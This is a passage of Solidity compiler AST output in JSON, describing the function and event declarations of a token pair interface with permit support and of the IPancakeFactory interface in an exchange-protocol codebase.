												"src": "722:15:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1853,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "722:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1856,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 1861,
												"src": "739:13:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1855,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "739:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "721:32:4"
									},
									"returnParameters": {
										"id": 1860,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1859,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 1861,
												"src": "772:4:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 1858,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "772:4:4",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "771:6:4"
									},
									"scope": 1916,
									"src": "705:73:4",
									"stateMutability": "nonpayable",
									"superFunction": 2047,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 1870,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "transfer",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1866,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1863,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 1870,
												"src": "802:10:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1862,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "802:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1865,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 1870,
												"src": "814:13:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1864,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "814:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "801:27:4"
									},
									"returnParameters": {
										"id": 1869,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1868,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 1870,
												"src": "847:4:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 1867,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "847:4:4",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "846:6:4"
									},
									"scope": 1916,
									"src": "784:69:4",
									"stateMutability": "nonpayable",
									"superFunction": 2056,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 1881,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "transferFrom",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1877,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1872,
												"name": "from",
												"nodeType": "VariableDeclaration",
												"scope": 1881,
												"src": "890:12:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1871,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "890:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1874,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 1881,
												"src": "912:10:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1873,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "912:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1876,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 1881,
												"src": "932:13:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1875,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "932:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "880:71:4"
									},
									"returnParameters": {
										"id": 1880,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1879,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 1881,
												"src": "970:4:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 1878,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "970:4:4",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "969:6:4"
									},
									"scope": 1916,
									"src": "859:117:4",
									"stateMutability": "nonpayable",
									"superFunction": 2067,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 1886,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "DOMAIN_SEPARATOR",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1882,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1007:2:4"
									},
									"returnParameters": {
										"id": 1885,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1884,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 1886,
												"src": "1033:7:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												},
												"typeName": {
													"id": 1883,
													"name": "bytes32",
													"nodeType": "ElementaryTypeName",
													"src": "1033:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1032:9:4"
									},
									"scope": 1916,
									"src": "982:60:4",
									"stateMutability": "view",
									"superFunction": 2072,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 1891,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "PERMIT_TYPEHASH",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1887,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1072:2:4"
									},
									"returnParameters": {
										"id": 1890,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1889,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 1891,
												"src": "1098:7:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												},
												"typeName": {
													"id": 1888,
													"name": "bytes32",
													"nodeType": "ElementaryTypeName",
													"src": "1098:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1097:9:4"
									},
									"scope": 1916,
									"src": "1048:59:4",
									"stateMutability": "pure",
									"superFunction": 2077,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 1898,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "nonces",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1894,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1893,
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"scope": 1898,
												"src": "1129:13:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1892,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1129:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1128:15:4"
									},
									"returnParameters": {
										"id": 1897,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1896,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 1898,
												"src": "1167:7:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1895,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1167:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1166:9:4"
									},
									"scope": 1916,
									"src": "1113:63:4",
									"stateMutability": "view",
									"superFunction": 2084,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 1915,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "permit",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1913,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1900,
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"scope": 1915,
												"src": "1207:13:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1899,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1207:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1902,
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 1915,
												"src": "1230:15:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1901,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1230:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1904,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 1915,
												"src": "1255:13:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1903,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1255:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1906,
												"name": "deadline",
												"nodeType": "VariableDeclaration",
												"scope": 1915,
												"src": "1278:16:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1905,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1278:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1908,
												"name": "v",
												"nodeType": "VariableDeclaration",
												"scope": 1915,
												"src": "1304:7:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 1907,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "1304:5:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1910,
												"name": "r",
												"nodeType": "VariableDeclaration",
												"scope": 1915,
												"src": "1321:9:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												},
												"typeName": {
													"id": 1909,
													"name": "bytes32",
													"nodeType": "ElementaryTypeName",
													"src": "1321:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1912,
												"name": "s",
												"nodeType": "VariableDeclaration",
												"scope": 1915,
												"src": "1340:9:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												},
												"typeName": {
													"id": 1911,
													"name": "bytes32",
													"nodeType": "ElementaryTypeName",
													"src": "1340:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1197:158:4"
									},
									"returnParameters": {
										"id": 1914,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1364:0:4"
									},
									"scope": 1916,
									"src": "1182:183:4",
									"stateMutability": "nonpayable",
									"superFunction": 2101,
									"visibility": "external"
								}
							],
							"scope": 1917,
							"src": "62:1305:4"
						}
					],
					"src": "36:1332:4"
				},
				"id": 4
			},
			"src/exchange-protocol/contracts/interfaces/IPancakeFactory.sol": {
				"ast": {
					"absolutePath": "src/exchange-protocol/contracts/interfaces/IPancakeFactory.sol",
					"exportedSymbols": {
						"IPancakeFactory": [
							1984
						]
					},
					"id": 1985,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1918,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "36:24:5"
						},
						{
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": null,
							"fullyImplemented": false,
							"id": 1984,
							"linearizedBaseContracts": [
								1984
							],
							"name": "IPancakeFactory",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"anonymous": false,
									"documentation": null,
									"id": 1928,
									"name": "PairCreated",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1927,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1920,
												"indexed": true,
												"name": "token0",
												"nodeType": "VariableDeclaration",
												"scope": 1928,
												"src": "112:22:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1919,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "112:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1922,
												"indexed": true,
												"name": "token1",
												"nodeType": "VariableDeclaration",
												"scope": 1928,
												"src": "136:22:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1921,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "136:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1924,
												"indexed": false,
												"name": "pair",
												"nodeType": "VariableDeclaration",
												"scope": 1928,
												"src": "160:12:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1923,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "160:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1926,
												"indexed": false,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 1928,
												"src": "174:7:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1925,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "174:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "111:71:5"
									},
									"src": "94:89:5"
								},
								{
									"body": null,
									"documentation": null,
									"id": 1933,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "feeTo",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1929,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "203:2:5"
									},
									"returnParameters": {
										"id": 1932,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1931,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 1933,
												"src": "229:7:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1930,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "229:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "228:9:5"
									},
									"scope": 1984,
									"src": "189:49:5",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 1938,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "feeToSetter",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1934,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "264:2:5"
									},
									"returnParameters": {
										"id": 1937,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1936,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 1938,
												"src": "290:7:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1935,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "290:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "289:9:5"
									},
									"scope": 1984,
									"src": "244:55:5",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 1947,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "getPair",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1943,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1940,
												"name": "tokenA",
												"nodeType": "VariableDeclaration",
												"scope": 1947,
												"src": "322:14:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1939,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "322:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1942,
												"name": "tokenB",
												"nodeType": "VariableDeclaration",
												"scope": 1947,
												"src": "338:14:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1941,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "338:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "321:32:5"
									},
									"returnParameters": {
										"id": 1946,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1945,
												"name": "pair",
												"nodeType": "VariableDeclaration",
												"scope": 1947,
												"src": "377:12:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1944,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "377:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "376:14:5"
									},
									"scope": 1984,
									"src": "305:86:5",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 1954,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "allPairs",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1950,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1949,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 1954,
												"src": "415:7:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1948,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "415:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "414:9:5"
									},
									"returnParameters": {
										"id": 1953,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1952,
												"name": "pair",
												"nodeType": "VariableDeclaration",
												"scope": 1954,
												"src": "447:12:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1951,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "447:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "446:14:5"
									},
									"scope": 1984,
									"src": "397:64:5",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 1959,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "allPairsLength",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1955,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "490:2:5"
									},
									"returnParameters": {
										"id": 1958,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1957,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 1959,
												"src": "516:7:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1956,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "516:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "515:9:5"
									},
									"scope": 1984,
									"src": "467:58:5",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 1968,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "createPair",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1964,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1961,
												"name": "tokenA",
												"nodeType": "VariableDeclaration",
												"scope": 1968,
												"src": "551:14:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1960,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "551:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1963,
												"name": "tokenB",
												"nodeType": "VariableDeclaration",
												"scope": 1968,
												"src": "567:14:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1962,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "567:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "550:32:5"
									},
									"returnParameters": {
										"id": 1967,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1966,
												"name": "pair",
												"nodeType": "VariableDeclaration",
												"scope": 1968,
												"src": "601:12:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1965,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "601:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "600:14:5"
									},
									"scope": 1984,
									"src": "531:84:5",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 1973,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "setFeeTo",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1971,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1970,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 1973,
												"src": "639:7:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1969,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "639:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "638:9:5"
									},
									"returnParameters": {
										"id": 1972,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "656:0:5"
									},
									"scope": 1984,
									"src": "621:36:5",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 1978,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "setFeeToSetter",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1976,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1975,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 1978,
												"src": "687:7:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1974,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "687:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "686:9:5"
									},
									"returnParameters": {
										"id": 1977,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "704:0:5"
									},
									"scope": 1984,
									"src": "663:42:5",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 1983,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "INIT_CODE_PAIR_HASH",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1979,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "739:2:5"
									},
									"returnParameters": {
										"id": 1982,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1981,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 1983,
												"src": "765:7:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												},
												"typeName": {
													"id": 1980,
													"name": "bytes32",
													"nodeType": "ElementaryTypeName",
													"src": "765:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
